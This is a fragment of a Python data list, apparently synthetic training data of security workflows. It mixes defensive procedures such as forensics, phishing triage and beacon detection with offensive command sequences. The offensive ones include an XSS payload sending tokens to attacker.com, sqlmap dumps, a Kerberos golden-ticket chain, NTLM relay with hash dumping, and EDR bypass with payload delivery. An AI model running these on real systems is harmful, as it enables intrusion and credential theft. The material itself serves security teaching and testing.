        "disk image: dd if=/dev/sda of=disk.img bs=4k status=progress",
        "hash image: sha256sum disk.img > disk.img.sha256",
        "volatility -f memory.dmp imageinfo (identify OS)",
        "volatility --profile=Win10x64 pslist (process list)",
        "volatility --profile=Win10x64 netscan (network connections)",
        "autopsy: load disk image, extract artifacts",
        "plaso: log2timeline untuk unified timeline"],
       ["memory_acquire","disk_image","hash_verify","profile_detect","process_enum","net_enum","artifact_extract","timeline"],
       [("volatility","memory forensics"),("autopsy","disk forensics"),("plaso","timeline creation")],
       "hash image segera setelah acquire — proof of integrity untuk legal proceedings",
       "breach investigation: memory dump → svchost injection, disk → attacker tools in /tmp",
       "forensics investigator",
       "Forensics workflow: memory dump + disk image acquired, hashed. volatility analyzing..."),

    _e("phishing email analysis dan response workflow",
       ["phishing email = common initial vector, butuh quick analysis dan response",
        "analyze dulu sebelum click apapun — gunakan isolated environment",
        "extract IOCs untuk update email gateway dan SIEM"],
       ["headers: view raw message headers → analyze Received, SPF, DKIM, DMARC",
        "save attachment → VM yang isolated → check dengan VirusTotal hash",
        "URL analysis: extract URLs → URLScan.io → check reputation",
        "sender IP: abuseipdb lookup, whois, reverse DNS",
        "sandbox: any.run atau joe sandbox untuk attachment analysis",
        "IOC extract: IP, domain, hash, email → add ke block list",
        "SIEM: search for other recipients + clicked indicators"],
       ["header_analyze","attachment_check","url_analyze","ip_reputation","sandbox_run","ioc_extract","siem_hunt"],
       [("any.run","online sandbox"),("urlscan.io","URL analysis"),
        ("abuseipdb","IP reputation check")],
       "NEVER analyze attachment di production machine — always isolated VM atau sandbox",
       "phishing email: sender spoof valid, attachment → dropper confirmed, 5 other recipients",
       "phishing analyst",
       "Phishing analysis: header spoof detected, attachment → any.run → dropper! 5 recipients found."),

    _e("network traffic analysis untuk C2 beacon detection",
       ["C2 beacon = regular outbound connection dari malware ke command server",
        "characteristics: reguler interval, kecil payload, unusual destination",
        "zeek logs + statistical analysis untuk detection"],
       ["zeek -r suspicious.pcap (generate protocol logs)",
        "cat conn.log | zeek-cut ts id.orig_h id.resp_h resp_bytes duration | sort",
        "python3: analyze conn.log untuk reguler interval patterns",
        "cat dns.log | zeek-cut query answers | sort | uniq -c (DNS analysis)",
        "tshark -r pcap -Y 'tcp.stream' -T fields -e ip.dst | sort | uniq -c | sort -rn (top destinations)",
        "check unusual destinations: abuseipdb, virustotal untuk IP reputation"],
       ["zeek_parse","conn_analyze","interval_detect","dns_analyze","ip_tally","reputation_check"],
       [("zeek","network protocol analyzer"),("tshark","packet analysis"),
        ("python","statistical beacon analysis")],
       "beaconing interval sering sedikit jitter untuk avoid detection — gunakan statistical analysis",
       "suspicious.pcap: beacon tiap 60±5 detik ke 185.220.x.x, DNS tunneling subdomains",
       "network forensics analyst",
       "C2 beacon: zeek conn.log → regular 60s interval ke 185.220.x.x detected!"),

    _e("Docker container security audit workflow",
       ["container audit = image scanning + runtime security + configuration review",
        "image yang sudah lama sering berisi vulnerable packages",
        "runtime: privileged, capability, mount issues"],
       ["docker ps (list running containers)",
        "trivy image nginx:latest (scan image untuk vulnerabilities)",
        "docker inspect container_id (review configuration)",
        "docker exec -it container_id /bin/sh (enter container untuk manual check)",
        "check: /proc/1/cgroup (are we in container?)",
        "check: mount | grep docker.sock (socket mounted?)",
        "ls /proc/self/fd/ | xargs -I{} ls -la /proc/self/fd/{} 2>/dev/null (capability check)"],
       ["container_list","image_scan","config_review","manual_inspect","socket_check","cap_check"],
       [("trivy","container image vulnerability scanner"),
        ("docker","container inspection")],
       "docker.sock mount = immediate host escape — instant critical finding",
       "Docker audit: nginx image 45 CVEs, 1 container với docker.sock mounted",
       "container security auditor",
       "Docker audit: trivy scan → 45 CVEs in nginx. docker.sock mounted → escape possible!"),

    _e("automated vulnerability scan dan triage workflow",
       ["scan → triage → prioritize → assign → track → verify adalah VM cycle",
        "automation penting untuk consistency dan speed",
        "prioritization berdasarkan: CVSS + asset criticality + exploitability"],
       ["nessus scan: launch scan terhadap target range",
        "export results sebagai CSV atau via API",
        "python3 parse_nessus.py results.csv → categorize by severity",
        "enrich: check EPSS score dan CISA KEV untuk exploitability",
        "create Jira tickets untuk Critical dan High (auto-create via API)",
        "assign ke responsible team berdasarkan asset owner",
        "tracking dashboard: update via Jira API"],
       ["scan_launch","result_export","triage_parse","epss_enrich","ticket_create","team_assign","dashboard_update"],
       [("nessus","vulnerability scanner"),("python","triage automation"),
        ("jira","vulnerability tracking")],
       "EPSS score + CISA KEV = better prioritization dari CVSS alone",
       "VM workflow: 2500 findings → triage → 45 critical, 200 high, 89% dengan Jira tickets",
       "vulnerability management automation engineer",
       "VM workflow: Nessus scan → parse → EPSS enrich → auto-create 245 Jira tickets!"),

    _e("incident response workflow untuk data breach",
       ["data breach IR = contain → assess scope → notify → remediate → learn",
        "notification timeline: GDPR 72 jam, HIPAA 60 hari, state laws berbeda",
        "preserve ALL evidence sebelum cleanup"],
       ["1. Detection → IR team mobilize dalam <1 jam",
        "2. Isolation: affected systems dari network",
        "3. Evidence preserve: memory dump, logs, disk images",
        "4. Scope: apa data yang exposed? Berapa records?",
        "5. Root cause: bagaimana attacker masuk?",
        "6. Legal/compliance: notify DPO, assess notification requirements",
        "7. Eradication: remove access, patch vuln, reset credentials",
        "8. Recovery: restore systems dari clean backup",
        "9. Post-incident report + lessons learned"],
       ["detect","isolate","preserve","scope","root_cause","legal","eradicate","recover","report"],
       [("volatility","memory forensics"),("autopsy","disk forensics"),
        ("splunk","log analysis untuk scope")],
       "notification requirements sering lebih strict dari yang di-expect — consult legal early",
       "data breach: 50k PII records exposed, root cause: SQL injection, GDPR notification required",
       "incident response lead",
       "Breach IR: isolation selesai. Preserving evidence. Scope: 50k records. Legal notified."),

    _e("threat hunt untuk insider threat indicators",
       ["insider threat hunt = behavioral analytics + data access patterns + anomaly detection",
        "focus: unusual data access, large download, off-hours activity, sensitive file access"],
       ["SIEM query: user access volume > 2 std deviations dari baseline",
        "DLP alert: large file transfer ke external (personal email, cloud storage)",
        "email analysis: external forwarding rules configured",
        "USB activity: removable media usage dari sensitive systems",
        "VPN: off-hours logins + unusual geographic location",
        "Database: bulk SELECT query dari specific user pada production DB",
        "correlation: combine semua indicators untuk suspect shortlist"],
       ["baseline_query","dlp_check","email_rule_hunt","usb_audit","vpn_analyze","db_query_hunt","correlate"],
       [("splunk","SIEM behavioral analytics"),("microsoft sentinel","cloud SIEM"),
        ("varonis","data access monitoring")],
       "false positive tinggi untuk insider threat — correlation multiple indicators penting",
       "insider hunt: 1 suspect via bulk DB download + external email forward + off-hours VPN",
       "insider threat hunter",
       "Insider hunt: DB bulk access → external forward → off-hours VPN. 1 suspect identified."),

    _e("subdomain takeover exploitation workflow",
       ["subdomain takeover = claim abandoned service yang masih di-CNAME",
        "berbeda service = berbeda cara claim"],
       ["subfinder -d target.com -o subs.txt",
        "subjack -w subs.txt -t 100 -ssl -o potential_takeovers.txt",
        "manual verify: curl SUBDOMAIN dan observe error message",
        "identify service: GitHub Pages? Heroku? S3? Netlify?",
        "GitHub Pages takeover: create repo github.com/user/SUBDOMAIN",
        "add CNAME file dengan nilai subdomain",
        "verify: curl SUBDOMAIN → controlled content served!",
        "document sebagai finding — DO NOT deploy malicious content"],
       ["subdomain_collect","automated_scan","manual_verify","service_id","claim_account","cname_setup","verify","document"],
       [("subjack","subdomain takeover detector"),("nuclei","takeover templates")],
       "HANYA verify kepemilikan dengan neutral content — jangan exploit lebih jauh",
       "staging.target.com → GitHub Pages takeover, controlled content served",
       "subdomain takeover analyst",
       "Takeover: staging.target.com CNAME ke unclaimed GitHub Pages. Creating repo → serving content!"),

    _e("ransomware incident containment dan recovery workflow",
       ["ransomware IR memiliki time pressure — setiap detik lebih banyak file encrypted",
        "containment priority: network isolation > evidence > everything else"],
       ["T+0: Detection → isolasi immediate semua infected hosts dari network",
        "T+30min: Identify scope — scan network untuk indicators of infection",
        "T+1h: Evidence preserve — memory dump infected hosts sebelum shutdown",
        "T+2h: Identify variant — upload sample ke ID-Ransomware atau VirusTotal",
        "T+3h: Check backup integrity — verify clean backup exists",
        "T+4h: Eradication — reimage infected systems",
        "T+5h: Restore — recovery dari clean backup",
        "T+24h: Post-incident — patch vuln, harden, improve monitoring"],
       ["detect","isolate","scope","evidence","id_variant","backup_check","eradicate","restore","harden"],
       [("id-ransomware","ransomware variant identification"),("volatility","memory forensics")],
       "backup yang infected juga tidak berguna — verify backup date dan integrity dulu",
       "LockBit 3.0 IR: 5 hosts isolated, backup clean (2 hari lalu), recovery 6 jam",
       "ransomware incident responder",
       "Ransomware IR: T+0 isolation. T+1h: LockBit 3.0 identified. T+3h: clean backup verified."),

    _e("OAuth token theft dan account takeover workflow",
       ["OAuth token theft = steal access token untuk impersonate user",
        "vectors: XSS + token in URL/localStorage, SSRF, open redirect"],
       ["identify: apakah token disimpan di URL fragment atau localStorage?",
        "XSS payload: <script>fetch('https://attacker.com?t='+localStorage.getItem('token'))</script>",
        "open redirect: redirect_uri=https://evil.com/callback → capture code",
        "intercept: burpsuite untuk capture token dari API response",
        "replay: use stolen token untuk authenticated API calls",
        "verify: curl https://api.target.com/me -H 'Authorization: Bearer STOLEN_TOKEN'"],
       ["storage_check","xss_steal","redirect_capture","response_intercept","token_replay","api_verify"],
       [("burpsuite","OAuth flow interception"),("xsshunter","blind XSS for token theft")],
       "PKCE mencegah authorization code interception — check apakah diimplementasi",
       "OAuth: token di localStorage, XSS steal berhasil, API calls as victim confirmed",
       "OAuth attack specialist",
       "OAuth attack: token in localStorage → XSS steal → API calls as victim user!"),

    _e("DNS reconnaissance dan subdomain enumeration workflow",
       ["DNS recon adalah foundation dari external footprint",
        "multiple technique untuk maximum coverage"],
       ["subfinder -d target.com -o subfinder.txt",
        "amass enum -passive -d target.com -o amass.txt",
        "dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million.txt -o brute.txt",
        "curl 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value' > ct.txt",
        "cat subfinder.txt amass.txt brute.txt ct.txt | sort -u > all_subs.txt",
        "dnsx -l all_subs.txt -o resolved.txt (validate resolution)",
        "httpx -l resolved.txt -title -status-code -o live.txt"],
       ["passive_enum","active_brute","ct_log","merge_dedupe","dns_resolve","http_probe"],
       [("subfinder","passive enum"),("amass","OSINT enum"),
        ("dnsx","DNS brute + resolve"),("httpx","HTTP probe")],
       "merge dan deduplicate sebelum DNS resolve untuk efisiensi",
       "target.com — 234 unique subs dari 4 sources, 156 resolved, 89 live",
       "DNS recon specialist",
       "DNS recon: subfinder+amass+brute+CT → 234 unique, dnsx resolve → 156 active"),

    _e("endpoint detection bypass dan payload delivery workflow",
       ["EDR bypass workflow: identify → analyze hooks → craft bypass → test → deliver",
        "selalu test di isolated environment dengan same EDR version"],
       ["identify EDR: tasklist | findstr /i defender,crowdstrike,carbon",
        "AMSITrigger.exe -i payload.ps1 (identify AMSI triggers)",
        "DefenderCheck.exe payload.exe (identify AV signatures)",
        "obfuscate: Invoke-Obfuscation atau custom encoding",
        "test di VM dengan same EDR: does it run? Alert fired?",
        "delivery: phishing email, USB drop, or via compromised system",
        "verify execution: check callback dari C2"],
       ["edr_identify","trigger_scan","signature_check","obfuscate","isolated_test","delivery","c2_verify"],
       [("AMSITrigger","AMSI trigger identification"),("Invoke-Obfuscation","PowerShell obfuscation"),
        ("cobalt strike","C2 framework")],
       "selalu test di isolated lab sebelum production environment",
       "CrowdStrike bypass: direct syscall + obfuscation, payload executed undetected",
       "red team payload specialist",
       "Payload delivery: AMSITrigger scan → obfuscate → isolated test → CrowdStrike bypass!"),

    _e("SQL injection exploitation dan data extraction workflow",
       ["SQLi exploitation = dari detection ke data extraction secara sistematis",
        "tidak semua SQLi bisa langsung dump data — perlu identify DB type dulu"],
       ["sqlmap -u 'https://target.com/page?id=1' --dbs (list databases)",
        "sqlmap -u URL -D targetdb --tables (list tables)",
        "sqlmap -u URL -D targetdb -T users --columns (list columns)",
        "sqlmap -u URL -D targetdb -T users -C username,password --dump (dump data)",
        "jika WAF: sqlmap --tamper=space2comment,randomcase --level=3",
        "jika blind: sqlmap --technique=T (time-based blind)",
        "save: sqlmap output ke file untuk evidence"],
       ["db_list","table_list","col_list","data_dump","waf_bypass","blind_technique","evidence_save"],
       [("sqlmap","automated SQL injection exploitation")],
       "minimal extraction untuk PoC — jangan dump entire database production",
       "SQLi: MySQL db, 'users' table dengan 50k records, admin:hash dumped as PoC",
       "SQLi exploitation analyst",
       "SQLi: --dbs → targetdb found. --dump users → 50k records, admin credentials extracted."),

    _e("LDAP enumeration workflow untuk Active Directory",
       ["LDAP enum = query AD untuk users, groups, policies, GPO",
        "authenticated LDAP query jauh lebih informatif dari anonymous",
        "ldapsearch, windapsearch, atau ldapdomaindump untuk structured output"],
       ["ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local' -D 'user@domain.local' -W '(objectClass=*)' (all objects)",
        "windapsearch -d domain.local -u user@domain.local -p pass --da (domain admins)",
        "windapsearch --users --full (all users dengan full attributes)",
        "ldapdomaindump -u domain.local\\user -p pass ldap://DC_IP (comprehensive dump)",
        "analyze: kerberoastable users (servicePrincipalName set)",
        "analyze: ASREP roastable (dont_req_preauth set)"],
       ["basic_query","da_enum","user_full_dump","comprehensive_dump","kerberoast_identify","asrep_identify"],
       [("ldapsearch","LDAP queries"),("windapsearch","Windows AD LDAP enumeration"),
        ("ldapdomaindump","comprehensive LDAP dumping")],
       "servicePrincipalName attribute = kerberoastable account — prioritas untuk attack",
       "AD LDAP: 1200 users, 45 kerberoastable, 12 ASREP roastable",
       "Active Directory enumeration analyst",
       "LDAP dump: 1200 users, 45 SPN accounts (kerberoastable), 12 ASREP roastable found!"),

    _e("buffer overflow exploitation workflow untuk CTF",
       ["buffer overflow = overwrite return address untuk hijack execution flow",
        "steps: find offset → control EIP → find gadgets → shellcode"],
       ["checksec binary (identify protections: NX, PIE, stack canary, RELRO)",
        "python3 -c 'print(\"A\"*200)' | ./binary (test untuk crash)",
        "cyclic 200 | ./binary → gdb: info registers → find EIP value",
        "cyclic -l EIP_VALUE (find offset)",
        "find: ret gadget atau jmp esp → ROPgadget --binary ./binary --ret",
        "construct payload: python3 -c 'print(\"A\"*OFFSET + ret_addr + shellcode)'",
        "test payload dalam gdb sebelum remote"],
       ["protection_check","crash_test","offset_find","gadget_find","payload_construct","local_test","remote_exploit"],
       [("gdb peda","debugger untuk pwn"),("pwntools","CTF exploitation framework"),
        ("ROPgadget","ROP chain finder")],
       "checksec output menentukan exploitation technique — NX=no shellcode, need ROP",
       "CTF pwn: offset 64, NX enabled, ret2libc → system('/bin/sh') → shell!",
       "CTF pwn analyst",
       "Pwn: checksec → NX enabled. cyclic offset=64. ret2libc: system('/bin/sh') → shell!"),

    _e("cloud S3 bucket dan storage misconfiguration workflow",
       ["cloud storage misconfig = paling sering ditemukan dalam cloud assessment",
        "S3 public = data exposure, writable = malware hosting, logging off = blind"],
       ["aws s3 ls (list accessible buckets)",
        "aws s3api list-buckets (list owned buckets)",
        "for bucket in $(aws s3 ls | awk '{print $3}'); do aws s3api get-bucket-acl --bucket $bucket; done",
        "aws s3api get-bucket-policy --bucket TARGET (check bucket policy)",
        "aws s3 ls s3://target-bucket --no-sign-request (test public access)",
        "aws s3api get-bucket-logging --bucket TARGET (logging enabled?)",
        "aws s3api get-public-access-block --bucket TARGET (public block setting)"],
       ["bucket_list","acl_check","policy_check","public_test","logging_check","block_check"],
       [("aws CLI","S3 bucket assessment")],
       "S3 Block Public Access di account level overrides bucket-level settings",
       "S3 audit: 3 public buckets, 1 writable (malware hosting risk), 5 without logging",
       "cloud storage security analyst",
       "S3 audit: 3 public buckets found, 1 writable via no-sign-request. Logging: 5 disabled!"),

    _e("web server hardening verification workflow",
       ["hardening verification = setelah hardening, verify configuration berjalan sesuai spec",
        "test setiap hardening item secara praktis, bukan hanya config review"],
       ["nmap -sV -p 80,443 webserver.target (service version)",
        "testssl.sh https://webserver.target (TLS config verify)",
        "curl -v https://webserver.target (check security headers)",
        "nikto -h https://webserver.target (quick vulnerability check)",
        "gobuster dir -u https://webserver.target -w common.txt (path exposure)",
        "curl -X OPTIONS https://webserver.target (HTTP methods check)",
        "curl -H 'X-Forwarded-For: 127.0.0.1' https://webserver.target/admin (bypass test)"],
       ["service_check","tls_verify","header_check","vuln_scan","path_check","method_check","bypass_test"],
       [("testssl.sh","TLS verification"),("nikto","web vuln check"),
        ("curl","manual hardening verification")],
       "hardening checklist sering incomplete — always test practically, tidak hanya review config file",
       "web hardening: TLS 1.2+, CSP enabled, no TRACE, no server version — PASSED",
       "web server hardening verifier",
       "Hardening verify: TLS 1.2+ ✓, CSP ✓, TRACE disabled ✓, no server header ✓ — PASSED"),

    _e("source code security review workflow",
       ["code review workflow = systematic analysis untuk find security issues",
        "automated tools untuk pattern detection, manual untuk logic",
        "start dengan high-risk area: auth, payment, user input"],
       ["git log --oneline (recent commits untuk context)",
        "semgrep --config=p/security-audit . (automated SAST)",
        "bandit -r . (Python security linting)",
        "grep -r 'eval\\|exec\\|system\\|subprocess' . (dangerous function search)",
        "grep -r 'password\\|secret\\|apikey\\|token' . --include='*.py' (hardcoded secret search)",
        "review: authentication logic, session management code",
        "review: SQL query construction — ORM atau raw query?"],
       ["context_review","automated_sast","dangerous_func","secret_search","auth_review","db_review"],
       [("semgrep","SAST pattern matching"),("bandit","Python security linter")],
       "grep untuk dangerous functions adalah quick win untuk finding candidates",
       "code review: 3 eval() calls, 2 hardcoded secrets, SQL string concat in legacy module",
       "security code reviewer",
       "Code review: semgrep → 12 findings. grep eval → 3 matches. SQL concat → manual review!"),

    _e("kerberos attack chain workflow",
       ["kerberos attacks: ASREP roasting → kerberoasting → golden/silver ticket",
        "tidak semua attack applicable — check prerequisites dulu"],
       ["impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat (ASREP roast)",
        "impacket-GetUserSPNs domain.local/user:pass -request (kerberoast)",
        "hashcat -m 18200 asrep_hashes.txt rockyou.txt (crack ASREP)",
        "hashcat -m 13100 tgs_hashes.txt rockyou.txt (crack TGS)",
        "impacket-secretsdump domain.local/admin@DC (DCSync untuk krbtgt hash)",
        "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator (golden ticket)",
        "export KRB5CCNAME=ticket.ccache; impacket-psexec -k domain.local/Administrator@target"],
       ["asrep_roast","kerberoast","hash_crack","dcsync","golden_ticket_create","ticket_use"],
       [("impacket","Kerberos attack toolkit"),("hashcat","Kerberos hash cracking")],
       "golden ticket persistence butuh krbtgt password reset DUA KALI untuk invalidate",
       "Kerberos chain: ASREP→crack→lateral→DCSync→krbtgt→golden ticket (permanent access)",
       "Kerberos attack specialist",
       "Kerberos chain: ASREP roast → crack → lateral → DCSync → krbtgt → golden ticket!"),

    _e("web application authentication bypass workflow",
       ["auth bypass = akses resources tanpa valid credentials",
        "common: SQL injection, logic flaws, default creds, broken auth"],
       ["test: SQLi pada login — admin'--",
        "test: blank password, admin/admin, admin/password",
        "test: JWT none algorithm — alg:none, remove signature",
        "test: password reset logic — reset dengan attacker email, intercept token",
        "test: direct object reference — /admin?id=1 tanpa auth",
        "test: forced browsing — /admin/dashboard langsung tanpa login",
        "test: cookie tampering — change role=user ke role=admin"],
       ["sqli_bypass","default_cred","jwt_none","reset_logic","direct_access","forced_browse","cookie_tamper"],
       [("burpsuite","auth bypass testing"),("sqlmap","SQLi auth bypass")],
       "auth bypass sering kombinasi dari multiple teknik — test semuanya",
       "target: SQLi bypass admin'-- , JWT none algorithm bypass, forced browse /admin",
       "authentication bypass specialist",
       "Auth bypass: SQLi admin'-- → login! JWT none alg → bypass! Direct /admin → accessible!"),

    _e("SMTP dan email server security audit workflow",
       ["email server audit = relay test, banner info, user enum, TLS check",
        "open relay = server mau relay email untuk siapapun = spam dan reputasi damage"],
       ["nmap -sV -p 25,465,587 mail.target.com (service detect)",
        "telnet mail.target.com 25 (manual connect)",
        "EHLO attacker.com (check supported commands)",
        "VRFY admin (user enumeration via VRFY)",
        "swaks --to victim@company.com --from attacker@evil.com --server mail.target.com (open relay test)",
        "testssl.sh --starttls smtp mail.target.com:25 (TLS check)",
        "check SPF: dig txt target.com | grep spf"],
       ["service_detect","manual_connect","user_enum","open_relay_test","tls_check","spf_check"],
       [("nmap","SMTP service detection"),("swaks","SMTP testing tool"),
        ("testssl.sh","TLS SMTP verification")],
       "open relay = critical finding — ISPs bisa blacklist IP server",
       "mail.target.com: open relay confirmed, VRFY enum works, no TLS, SPF softfail",
       "email server security analyst",
       "SMTP audit: swaks open relay test → ACCEPTED! VRFY admin → user exists. TLS: disabled!"),

    _e("SSH security audit workflow",
       ["SSH audit = version, ciphers, key exchange algorithms, authentication methods",
        "weak: SSH1, password auth, weak ciphers (CBC, arcfour)",
        "ssh-audit untuk comprehensive check"],
       ["nmap -sV -p 22 target.com",
        "ssh-audit target.com (comprehensive SSH config audit)",
        "ssh -o 'PasswordAuthentication=yes' user@target.com test (password auth check)",
        "hydra -l root -P common_passwords.txt ssh://target.com -t 4 (brute force check)",
        "check: PermitRootLogin, PasswordAuthentication, MaxAuthTries dalam /etc/ssh/sshd_config",
        "check: authorized_keys files untuk unexpected keys"],
       ["version_detect","config_audit","auth_method_check","brute_test","config_review","key_audit"],
       [("ssh-audit","SSH configuration analyzer"),("hydra","SSH brute force")],
       "ssh-audit output color coded: FAIL=red, WARN=yellow — focus on FAIL dulu",
       "SSH audit: SSH 7.4, CBC ciphers, password auth enabled, root login allowed",
       "SSH security auditor",
       "SSH audit: ssh-audit → 5 weak ciphers, password auth, root login allowed! Critical."),

    _e("NTLM relay attack workflow",
       ["NTLM relay = capture NTLM auth dan relay ke target yang tidak menggunakan signing",
        "SMB signing disabled = relay attack possible",
        "prerequisite: listener yang menerima NTLM auth (LLMNR/NBT-NS poisoning atau force auth)"],
       ["crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt (find targets tanpa signing)",
        "responder -I eth0 -wd (LLMNR/NBT-NS/WPAD poisoning)",
        "ntlmrelayx.py -tf relay_targets.txt -smb2support (relay listener)",
        "tunggu auth attempt → relay → shell atau SAM dump",
        "ntlmrelayx.py -tf targets.txt --dump-lm (dump hashes dari relay)",
        "ntlmrelayx.py -tf targets.txt -c 'whoami' (command execution)"],
       ["relay_target_find","responder_start","relay_setup","auth_capture","hash_dump","command_exec"],
       [("responder","LLMNR/NBT-NS poisoning"),("ntlmrelayx","NTLM relay tool"),
        ("crackmapexec","SMB signing check")],
       "SMB signing enabled = relay tidak possible ke SMB — try LDAP atau HTTP relay",
       "NTLM relay: 15 targets without signing, responder+ntlmrelayx → 3 SAM dumps",
       "NTLM relay attack specialist",
       "NTLM relay: responder poison → captured auth → relay → SAM dump from 3 hosts!"),

    _e("web scraping dan OSINT aggregation workflow untuk target",
       ["web scraping untuk OSINT = collect public information secara automated",
        "respect robots.txt, tidak terlalu agresif pada rate"],
       ["theHarvester -d target.com -b all -l 200 (email + subdomain dari multiple sources)",
        "gau target.com (historical URLs dari wayback + crawlers)",
        "katana -u https://target.com -d 5 -silent (modern crawler)",
        "shodan search 'org:Target Inc' --fields ip,port,product",
        "censys search 'target.com' --index certificates",
        "merge semua results ke master OSINT database",
        "deduplicate dan categorize: emails, IPs, subdomains, technologies"],
       ["harvester_run","url_collect","crawl","shodan_query","censys_query","merge","categorize"],
       [("theHarvester","multi-source OSINT"),("gau","historical URL collection"),
        ("shodan","internet scan data")],
       "merge dari 5+ sources memberikan 2-3x lebih banyak data dari single source",
       "OSINT aggregate: 234 emails, 156 subdomains, 45 exposed services, 12 technologies",
       "OSINT aggregation analyst",
       "OSINT aggregate: 6 sources merged → 234 emails, 156 subs, 45 exposed services!"),
]
